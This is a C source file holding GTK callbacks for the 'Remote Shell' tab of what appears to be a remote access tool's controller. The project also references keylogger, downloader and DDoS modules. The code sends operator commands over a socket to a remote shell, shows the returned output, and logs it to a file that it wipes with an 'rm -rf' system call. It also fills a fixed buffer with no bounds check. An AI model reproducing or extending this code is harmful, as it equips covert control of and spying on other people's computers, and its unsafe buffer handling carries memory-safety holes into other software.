#include <stdio.h>
#include <stdlib.h>
#include <string.h>  //strlen()

#include <sys/types.h>  // send()
#include <sys/socket.h>  // send()
#include <netinet/in.h>  // SOCKADDR_IN
#include <arpa/inet.h>  // inet_addr()
#include <netdb.h>  //gethostbyaddr()

#include <gtk-2.0/gtk/gtk.h>

#include "../includes/constants.h"
#include "../includes/callbacks_remote_shell.h"
#include "../includes/keylogger.h"
#include "../includes/utils.h"
#include "../includes/remote_shell.h"
#include "../includes/downloader.h"


GtkWidget *main_win;

const gchar *chemin;
GtkWidget *upload_entry;

const gchar *server_ip;
const gchar *server_port;
int port;

SOCKET remote_shell_sock;

GtkWidget *text_view;
GtkWidget *rs_text_view;
GtkWidget *ddos_text_view;
GtkWidget *historic_text_view;


/** TAB : Remote Shell **/

void cb_start_remote_shell(GtkButton *button, gpointer user_data)
{
    GtkWidget *start_remote_shell_dialog = NULL;
    
    if(system("rm -rf /var/log/remote_shell.log") == -1)
    {
        error("rm -rf remote_shell", "cb_start_remote_shell()");
        return;   
    }

    start_remote_shell_dialog = gtk_message_dialog_new (GTK_WINDOW(main_win), GTK_DIALOG_MODAL, GTK_MESSAGE_QUESTION, GTK_BUTTONS_YES_NO, "Launch the Remote Shell ?");

    switch(gtk_dialog_run(GTK_DIALOG(start_remote_shell_dialog)))
    {
        case GTK_RESPONSE_YES:
       
            gtk_widget_destroy(start_remote_shell_dialog);
            remote_shell();
            break;

        case GTK_RESPONSE_NO:
            gtk_widget_destroy(start_remote_shell_dialog);
            break;

        default :
            gtk_widget_destroy(start_remote_shell_dialog);
            break;
    }

    /* Parametres inutilises */
    (void)button;
    (void)user_data;

    return;
}

void cb_send_cmd(GtkWidget *widget, gpointer user_data)
{
    //SOCKET remote_shell_sock = 0;

    GtkTextBuffer *text_buffer = NULL;
    gchar *text = NULL;
    GtkTextIter start;
    GtkTextIter end;

    gchar *utf8_text = NULL;

    FILE *log_cmd_results = NULL;

    char *buffer = NULL;
    const char *buffer_cmd = NULL;
    char *final_buffer = NULL;
    char *start_command = "> Command : ";
    char historic[MAXDATASIZE] = "";
    
    size_t data_len = 0;

    
    final_buffer = malloc(MAXDATASIZE  * sizeof(char));
    if(final_buffer == NULL)
    {
        error("malloc final buffer", "cb_send_cmd()");
        return;
    }

    buffer_cmd = gtk_entry_get_text(GTK_ENTRY(user_data));
    
    buffer = malloc(MAXDATASIZE * sizeof(char));
    if(buffer == NULL)
    {
        error("malloc() buffer", "send_cmd()");
        return;
    }

    log_cmd_results = fopen("/var/log/remote_shell.log", "a");
    if(log_cmd_results == NULL)
    {
        error("fopen()", "send_cmd()");
        return;
    }

    data_len = strlen(buffer_cmd) + 1;

    /** Send the command length **/
    if(send(remote_shell_sock, (char*)&data_len, sizeof(data_len), 0) == SOCKET_ERROR)
    {
        error("send() data_len", "send_cmd()");
        return;
    }

    /** Send the command **/
    if(send(remote_shell_sock, buffer_cmd, data_len, 0) == SOCKET_ERROR)
    {
        error("send() buffer_cmd", "send_cmd()");
        return;
    }

    if(strncmp(buffer_cmd, "quit", 4) == 0)
    {
        /** Obtaining the buffer associated with the widget **/
        text_buffer = gtk_text_view_get_buffer((GtkTextView*)(rs_text_view));

        /** Set the default buffer text. */
        gtk_text_buffer_set_text(text_buffer, "You're now disconnected from the server ...", -1);

        /** Obtain iters for the start and end of points of the buffer **/
        gtk_text_buffer_get_start_iter(text_buffer, &start);
        gtk_text_buffer_get_end_iter(text_buffer, &end);

        /** Get the entire buffer text **/
        text = gtk_text_buffer_get_text(text_buffer, &start, &end, FALSE);

        /** Print the text **/
        g_print("%s", text);

        g_free(text);

        free(buffer);
        free (final_buffer);
        
            
        log_cmd_results = fopen("/var/log/remote_shell.log", "w");
        if(log_cmd_results == NULL)
        {
            error("fopen()", "send_cmd()");
            return;
        }

        fputs("", log_cmd_results);

        fclose(log_cmd_results);

        //shutdown(remote_shell_sock, SHUT_WR);

        return;
    }

    /** Recieve the command output **/
    if(recv(remote_shell_sock, buffer, MAXDATASIZE, 0) == SOCKET_ERROR)
    {
        error("recv() buffer", "send_cmd()");
        return;
    }
    
    utf8_text = g_locale_to_utf8(start_command, strlen(start_command), NULL, NULL, NULL);
    
    final_buffer = strncpy(final_buffer, utf8_text, strlen(utf8_text) + 1);
    final_buffer = strncat(final_buffer, buffer_cmd, strlen(buffer_cmd) + 1);
    final_buffer = strncat(final_buffer, "\n", 3);
    final_buffer = strncat(final_buffer, buffer, strlen(buffer) + 1);
    
    //printf("Buffer_final = %s\n", final_buffer);
    
    utf8_text = g_locale_to_utf8(final_buffer, strlen(final_buffer), NULL, NULL, NULL);

    /** Obtaining the buffer associated with the widget **/
    text_buffer = gtk_text_view_get_buffer((GtkTextView*)(historic_text_view));

    /** Set the default buffer text. */
    gtk_text_buffer_set_text(text_buffer, utf8_text, -1);

    /** Obtain iters for the start and end of points of the buffer **/
    gtk_text_buffer_get_start_iter(text_buffer, &start);
    gtk_text_buffer_get_end_iter(text_buffer, &end);

    /** Get the entire buffer text **/
    text = gtk_text_buffer_get_text(text_buffer, &start, &end, FALSE);

    /** Print the text **/
    
    g_print("%s", text);

    g_free(text);
    
    
    utf8_text = g_locale_to_utf8(buffer, strlen(buffer), NULL, NULL, NULL);

    /** Obtaining the buffer associated with the widget **/
    text_buffer = gtk_text_view_get_buffer((GtkTextView*)(rs_text_view));

    /** Set the default buffer text. */
    gtk_text_buffer_set_text(text_buffer, utf8_text, -1);

    /** Obtain iters for the start and end of points of the buffer **/
    gtk_text_buffer_get_start_iter(text_buffer, &start);
    gtk_text_buffer_get_end_iter(text_buffer, &end);

    /** Get the entire buffer text **/
    text = gtk_text_buffer_get_text(text_buffer, &start, &end, FALSE);

    /** Print the text **/
    g_print("%s", text);

    g_free(text);

    /** Write the command output in log file **/
    if(fputs(final_buffer, log_cmd_results) == EOF)
    {
        error("fputs() Command\n", "send_cmd()");
        return;
    }
    
    fclose(log_cmd_results);
    
    log_cmd_results = fopen("/var/log/remote_shell.log", "r");
    if(log_cmd_results == NULL)
    {
        error("fopen()", "send_cmd()");
        return;
    }
    
    int caractereLu = 0;
    int i = 0;
    
    
    while((caractereLu = fgetc(log_cmd_results)) != EOF)
    {
        historic[i] = (char)caractereLu;
        i++;
    }
    
    utf8_text = g_locale_to_utf8(historic, strlen(historic), NULL, NULL, NULL);

    /** Obtaining the buffer associated with the widget **/
    text_buffer = gtk_text_view_get_buffer((GtkTextView*)(historic_text_view));

    /** Set the default buffer text. */
    gtk_text_buffer_set_text(text_buffer, utf8_text, -1);

    /** Obtain iters for the start and end of points of the buffer **/
    gtk_text_buffer_get_start_iter(text_buffer, &start);
    gtk_text_buffer_get_end_iter(text_buffer, &end);

    /** Get the entire buffer text **/
    text = gtk_text_buffer_get_text(text_buffer, &start, &end, FALSE);

    /** Print the text **/
    g_print("%s\n", text);

    g_free(text);
    
    

    free(buffer);
    free(final_buffer);

    fclose(log_cmd_results);
    
    /* Parametres inutilises */
    (void)widget;

    return;
}

